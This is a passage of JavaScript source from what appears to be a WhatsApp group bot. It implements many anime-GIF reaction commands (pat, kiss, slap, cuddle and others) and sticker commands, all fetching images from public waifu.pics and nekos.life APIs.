          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return LorenzoStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return newReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ToxxicTechInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
ToxxicTechInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
